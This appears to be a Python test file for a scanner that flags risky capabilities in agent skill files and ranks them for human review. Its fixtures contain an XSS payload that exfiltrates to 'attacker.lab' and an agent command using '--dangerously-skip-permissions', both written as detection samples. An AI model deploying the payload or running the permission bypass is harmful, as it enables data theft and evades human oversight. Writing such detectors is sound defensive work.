"""Measured confidence per category and block kind: which flags are lowered, which never are, and how a tenant's own
reviewer decisions move it."""
from skillproof.capabilities import build_manifest, diff_manifests
from skillproof.confidence import block_of, confidence
from skillproof.triage import triage

OLD = {"SKILL.md": b"---\nname: s\ndescription: Summarise notes.\n---\n# s\n"}


def _items(new_files, old_files=OLD, tenant_counts=None):
    new = build_manifest(new_files)
    ranked = triage(diff_manifests(build_manifest(old_files), new), new_manifest=new, tenant_counts=tenant_counts)
    return {(i["category"], i["value"]): i for i in ranked["items"]}, ranked


def test_block_kind_reads_steps_text_and_tests():
    files = {"SKILL.md": b"# s\n```bash\nnpm install x\n```\nThen `npm install y` if needed.\n", "tests/t.py": b"import os\n"}
    assert block_of(files, ["SKILL.md:3"]) == "step"
    assert block_of(files, ["SKILL.md:5"]) == "text"
    assert block_of(files, ["tests/t.py:1"]) == "test"
    assert block_of(files, ["SKILL.md:5", "SKILL.md:3"]) == "step"  # an action anywhere makes the capability real


def test_doubtful_ask_level_flag_is_lowered_with_its_numbers_but_block_level_is_not():
    # Decision: an ask-level kind of flag that labelled data shows is mostly a mention drops one level and says why;
    # a block-level fact (permission bypass) keeps its level, because missing it costs far more than one false alarm.
    new = {"SKILL.md": OLD["SKILL.md"] + b"Earlier reviews used `codex exec` for summaries.\n"
                       b"For long notes, run `claude -p 'summarise' --dangerously-skip-permissions`.\n"}
    items, _ = _items(new)
    spawn = items[("agent_spawning", "codex exec")]
    assert spawn["block"] == "text" and spawn["confidence"]["p"] < 0.5
    assert spawn["level"] == "note" and any("were real in" in r for r in spawn["reasons"])
    assert items[("agent_spawning", "permission bypass")]["level"] == "block"


def test_tenant_reviews_move_the_confidence():
    # Decision: after this tenant approved many such flags as real, the same kind of flag is no longer lowered.
    public = confidence("agent_spawning", "text")
    assert public["p"] < 0.5
    trusted = confidence("agent_spawning", "text", tenant_counts={"agent_spawning|text": [20, 0]})
    assert trusted["p"] > 0.5 and trusted["tenant_real"] == 20
    new = {"SKILL.md": OLD["SKILL.md"] + b"Earlier reviews used `codex exec` for summaries.\n"}
    items, _ = _items(new, tenant_counts={"agent_spawning|text": [20, 0]})
    assert not any("were real in" in r for r in items[("agent_spawning", "codex exec")]["reasons"])


def test_attack_toolkit_text_flags_are_grouped_for_one_review():
    old = {"SKILL.md": b"---\nname: xss-hunt\ndescription: Find and exploit XSS vulnerabilities in a target web app.\n---\n# x\n"}
    new = {"SKILL.md": old["SKILL.md"] + b"Payload: `<img src=x onerror=fetch('https://attacker.lab/steal')>`\n"}
    _, ranked = _items(new, old_files=old)
    assert ranked["groups"] and ranked["groups"][0]["kind"] == "offensive"
    _, plain = _items({"SKILL.md": OLD["SKILL.md"] + b"Call `fetch('https://api.example-team.dev/v1')`.\n"})
    assert plain["groups"] == []
